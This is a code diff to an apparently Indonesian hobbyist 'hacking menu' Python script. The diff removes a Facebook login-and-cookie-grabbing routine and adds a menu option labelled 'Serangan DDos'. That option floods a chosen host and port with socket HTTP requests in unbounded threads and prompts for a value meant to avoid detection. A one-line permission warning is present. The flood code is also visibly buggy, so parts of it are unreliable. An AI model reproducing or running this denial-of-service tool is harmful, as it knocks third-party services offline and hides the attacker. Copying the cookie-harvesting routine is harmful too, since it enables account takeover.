@@ -1,6 +1,8 @@
 import os
 import sys
 import time
+import socket
+import threading
 import requests
 from bs4 import BeautifulSoup
 import base64
@@ -42,7 +44,7 @@ def waktu(milisecond):
 
 def main():
     os.system("clear")
-    os.system("cls") # opsional tergantung update di mana
+    # os.system("cls") # opsional tergantung update di mana
 
     print(f'{putih}WELLCOME BOLO DI SC ADIYZD\n')
     print(f"""
@@ -54,8 +56,8 @@ def main():
     {putih}╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░  
     {x}
     """)
-    print(f"{BIRU} 1. Tess cookeis")
-    print(f"{BIRU} 2. Amankan password dengan encode")
+    print(f"{BIRU} 1. Serangan DDos")
+    print(f"{BIRU} 2. Amankan password akun")
     print(f"{BIRU} 3. Dekode password")
     print(f"{BIRU} 4. Dekode dokumen")
     print(f"{BIRU} 5. Encode ")
@@ -67,51 +69,58 @@ def main():
 
     #=================> bagian get cookies facebook <=================#
     if i_user_1 == "1":
-        print(f"{putih} Silahkan masukan username dan password!")
-        print(f"{KUNING} Pastikan akun tidak terkena cekpoin dan tidak ada sangkutan {putih}(A2F){x}")
-        print(f"{putih}Autentikasi 2 faktor{x}")
+        time.sleep(00.03)
+        os.system("clear")
+        print(f"{putih} Silahkan masukan Domain dan port yang dituju")
+        print(f"{KUNING} Pastikan Pengetesan di lakukan dengan ijin! {putih}(ADIYDDOS){x}")
+        print(f"{putih}GASSS <=|==========> {x}")
 
-        email = input(f"{putih}Masukan username / password :" + " ")
-        key = input(f"{putih} Maukan password anda {x} :" + " ")
+        # gass ddos 
+        try:
+            print(f" {abang}[!] {x}{biru} Harap masukan url tanpa ('https://')")
+            url = str(input(f"{abang}Masukan url target : {HIJAU}"))
+            port = input(f"{abang} Masukan port yang ingin di tuju : {HIJAU}")
+            durasi = int(input(f"{putih} Masukan seberapa lama anda ingin ddos :"))
+            ip2 = input(f"{putih}Masukan ip anda agar gak keditek :{HIJAU} ")
+            print(f"{x}")
 
-        session = requests.Session()
+            try:
+                IP = socket.gethostbyname(url)
+                print(f"{abang}Url target adalah : {HIJAU}https://{url}")
+                print(f"{abang}ip target nya adalah : {HIJAU}{IP}")
+            
+            # interaksi 
+            except socket.gaierror:
+                print(f"{x} Url tidak valid url: https://{url} IP: {IP}")
 
-        response = session.get(url)
-        ssid = BeautifulSoup(response.text, 'html.parser')
+            # batasan treas
+            max = 9999
+            gas = threading.Semaphore(max)
 
-        b_transparan = ssid.find_all("input", type="hidden")
+            def ddos():
+                while True:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((IP, port))
+                        s.sendto(("GET /:" + IP + "HTTP/1.1\r\n").encode('ascii'), (IP, port))
+                        s.sendto(("Host: " + ip2 + "\r\n\r\n").encode('ascii'), (IP, port))
+                        s.close()
+                    # berhentikan
+                    except Exception as e:
+                        print(f"Error: {e}")
+                        time.sleep(10)
+                        os.system("clear")
+            for i in range(durasi):
+                thr = threading.Thread(target=main)
+                thr.start()
 
-        data = {
-            'email' : email,
-            'pass' : key
-        }
-        
-        response = session.post(url=url, data=data)
+                waktu(320)
 
-        # validasi user login
-        if "user" not in response.url:
-            print(f"{HIJAU} Sucessfully! {x}")
+        except:
+            print(f"Error periksa lagi waktu \r{waktu(10)}")
+            
 
-            d_cok = session.cookies.get_dict()
-            print(f"{putih} Cookies anda adalah : \n {x}", d_cok)
-
-            print(disk)
-
-            print(f"{putih} Apakah anda ingin tetap berada di script adiy?{x}")
-            print(f"{putih} Silahkan masukan y untuk melanjutkan dan n untuk out")
-
-            ok = input(f"{putih} Masukan pilihan anda : ")
-
-            if ok.lower() == "y":
-                os.system("clear")
-                print(f"{HIJAU} System akan siap dalam waktu {waktu(60)} detik {x}")
-                main()
-            # erikan kondisi agar system berhenti
-            else:
-                os.system("clear")
-                print(f"{abang}{x}{tr}") # ambil nilai dari data
-                waktu(120) # berikan nilai wktu
-    
+             
     #=================> bagian encode <=================#
     elif i_user_1 == "2":
         print(f"{KUNING} Warning : {x} {putih} Password bersifat privasi jadi ingat dengan benar!")
@@ -134,5 +143,7 @@ def main():
         os.system("clear")
         print(f"{abang} Pilihan tidak ada / tidak valid !{x}")
         print(f"{time.sleep(3)}{main()}")
-main()
-                
+
+
+if __name__ == "__main__":
+    main()
